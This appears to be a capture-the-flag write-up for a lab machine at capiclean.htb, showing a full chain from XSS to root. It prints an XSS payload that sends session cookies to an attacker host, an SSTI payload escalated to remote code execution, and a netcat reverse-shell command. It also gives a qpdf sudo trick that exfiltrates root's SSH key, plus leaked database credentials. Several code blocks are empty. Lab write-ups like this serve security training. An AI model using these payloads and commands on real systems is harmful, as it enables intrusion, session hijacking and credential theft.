### Directory Enumeration
We have discovered an interesting directory: /dashboard. This suggests that we might need to perform a web-based attack to gain access to this directory.

## Exploitation
### Vulnerabilities Exploited

The XSS payload used to exploit the vulnerability is as follows:
```java
<img+src%3dx+onerror%3dthis.src%3d"http%3a//<IP>/"%2bbtoa(document.cookie)>
```
### Exploitation Steps
1. **Intercepting the Request:**
    - Intercept a request using BurpSuite in `http://capiclean.htb/quote`.
```python
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 93
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

service=Carpet+Cleaning&service=Tile+%26+Grout&service=Office+Cleaning&email=test%40email.com
```

2. **Sending XSS Payload:**
    - Send an XSS payload via the request to receive the cookie.
```python
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 159
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://capiclean.htb/quote
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

service=Carpet+Cleaning&service=Tile+%26+Grout&service=<img+src%3dx+onerror%3dthis.src%3d"http%3a//10.10.16.X/"%2bbtoa(document.cookie)>&email=test%40email.com
```

3. **Receiving and Decoding the Cookie:**
    - Set up a Python server to receive the cookie.
    - Decode the received base64 encoded cookie.
```java
[+] Serving files from /home/syztem4our666 [+]
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.71.9 - - [07/Apr/2024 15:06:58] code 404, message File not found
10.129.71.9 - - [07/Apr/2024 15:06:58] "GET /c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoSEU0US5yUTBwZm9uVUZHVElaZUhLVldNNTlsUDl5MW8=
```

Decoded we can see is a JSON web token, then paste it on cookies storage 
```java
session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhHE4Q.rQ0pfonUFGTIZeHKVWM59lP9y1o
```

4. **Exploiting Server-Side Template Injection (SSTI) on `/QRGenerator`:**
    - Exploit SSTI vulnerability by injecting Python code via `{{}}` syntax.
    - Attempt to execute arbitrary commands such as `id` to verify vulnerability.
```python
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/QRGenerator
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhHE4Q.rQ0pfonUFGTIZeHKVWM59lP9y1o
Upgrade-Insecure-Requests: 1

invoice_id=&form_type=scannable_invoice&qr_link={{7*7}}
```

And we get this on the final part of the response:
```java
<div class="qr-code-container"><div class="qr-code"><img src="data:image/png;base64,49" alt="QR Code"></div>
</body>
</html>
```

5. **Exploiting SSTI to Remote Code Execution (RCE):**
    - Escalate SSTI vulnerability to execute arbitrary commands, aiming for RCE.
    - Use payload to execute commands like `os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f')`.
```python
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/QRGenerator
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhHE4Q.rQ0pfonUFGTIZeHKVWM59lP9y1o
Upgrade-Insecure-Requests: 1

invoice_id=&form_type=scannable_invoice&qr_link={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

```java
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f')|attr('read')()}}
```

URL encode the reverse shell.
```java
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<IP>%204444%20%3E%2Ftmp%2Ff
```
And we get a shell as www-data
```java
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.X] from (UNKNOWN) [10.129.71.9] 36524
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
Stabilize the shell 
```java
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
## Post-Exploitation
### Privilege Escalation for user consuela
After gaining access to the system as `www-data`, we discovered a Python script (`app.py`) containing sensitive information such as database credentials:
```java
secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```
After successful authentication, you'll see the MySQL prompt:
```java
www-data@iclean:/opt/app$ mysql -u iclean -p capiclean
mysql -u iclean -p capiclean
Enter password: pxCsmnGLckUb

Using these credentials, we accessed the MySQL database and enumerated the tables:
```java

```
The attempt to crack Consuela's password hash was successful, revealing the password as "simple and clean". With this password, we successfully logged in as Consuela via SSH:
```java
|Hash|Type|Result|
|---|---|---|
|0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa  <br>ee11cbb19052e40b07aac0ca060c23ee|sha256|simple and clean|
```

```java
ssh consuela@10.129.71.9
```

After entering the password, we were able to access the system as Consuela:

```java
ssh consuela@10.129.71.9            
The authenticity of host '10.129.71.9 (10.129.71.9)' can't be established.

```

### Privilege Escalation for root

- Obtained SSH private key for `root` user by exploiting `qpdf` vulnerability.
- Authenticated as `root` using the obtained SSH private key.
- Escalated privileges to `root` and accessed `root` directory, confirming successful compromise.
We then checked Consuela's sudo privileges using the `sudo -l` command:

```java
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

Here are the steps outlined in the improved markdown writeup:

1. **Generate PDF with SSH Private Key Attachment**:
    
    - Run `sudo /usr/bin/qpdf --empty /tmp/juicy.pdf --qdf --add-attachment /root/.ssh/id_rsa --` to generate a PDF file (`juicy.pdf`) with the SSH private key attached.

Consuela has sudo privileges to run `/usr/bin/qpdf` without providing a password. This could be an opportunity for privilege escalation.

While trying to get the right command, i came with this command successfully getting "id_rsa" for root.

The command `sudo /usr/bin/qpdf --empty /tmp/lol.pdf --qdf --add-attachment /root/.ssh/id_rsa --` is attempting to exploit the `qpdf` utility to add an attachment to a PDF file in order to retrieve the `id_rsa` file, which is often the private SSH key for the `root` user. Let's break down the command:

`sudo`: This command is used to execute subsequent commands with superuser (root) privileges.
    
`/usr/bin/qpdf`: This is the path to the `qpdf` utility, a command-line program used to manipulate PDF files.
    
`--empty /tmp/lol.pdf`: This argument specifies that a new, empty PDF file named `lol.pdf` will be created in the `/tmp` directory.
    
`--qdf`: This argument specifies that the output PDF file should be in QDF (QDF is a format used by QPDF for representing PDF content).
    
`--add-attachment /root/.ssh/id_rsa`: This argument tells `qpdf` to add an attachment to the PDF file. The attachment being added is the `id_rsa` file located in the `/root/.ssh/` directory.
    
`--`: This double hyphen (`--`) signifies the end of command-line options. Anything after this is interpreted as an argument rather than an option.
    

So, in summary, this command is creating a new PDF file in the `/tmp` directory and attaching the `id_rsa` file (private SSH key for the `root` user) to it using the `qpdf` utility. The exploitation relies on the assumption that `qpdf` is configured to run with elevated privileges via `sudo`, allowing it to access sensitive files such as the `id_rsa` file.

```java
consuela@iclean:~$ sudo /usr/bin/qpdf --empty /tmp/juicy.pdf --qdf --add-attachment /root/.ssh/id_rsa --
consuela@iclean:~$ cd /tmp
consuela@iclean:/tmp$ ls
f
juicy.pdf
```

Use `cat juicy.pdf` to display the contents of the PDF file, which includes the SSH private key.

```java
cat juicy.pdf
```

```java

```

```java
nano id_rsa   
```

```java

```
Use the SSH private key to authenticate as the root user on the target server with `ssh -i id_rsa root@10.129.71.9`
```java
ssh -i id_rsa root@10.129.71.9
```
And we are root, get root flag.txt
```java
 ssh -i id_rsa root@10.129.71.9
